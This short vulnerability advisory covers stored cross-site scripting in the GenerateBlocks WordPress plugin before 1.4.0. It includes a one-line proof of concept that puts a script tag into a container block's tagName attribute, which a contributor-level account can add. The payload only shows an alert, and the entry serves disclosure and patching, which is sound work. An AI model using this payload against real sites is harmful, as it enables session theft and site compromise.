## WordPress Plugin Vulnerabilities

# GenerateBlocks < 1.4.0 - Contributor+ Stored Cross-Site Scripting

### Description

The plugin does not validate the generateblocks/container block's tagName attribute, which could allow users with a role as low as contributor to perform Cross-Site Scripting attacks.

### Proof of Concept

Add the following code in a post/page while in code editor mode with an Contributor account: <!-- wp:generateblocks/container {"uniqueId":"98c07d5a","tagName":"script src=data:application/javascript,alert(/XSS/)","isDynamic":true} /-->
Then view/preview the page/post to trigger the XSS
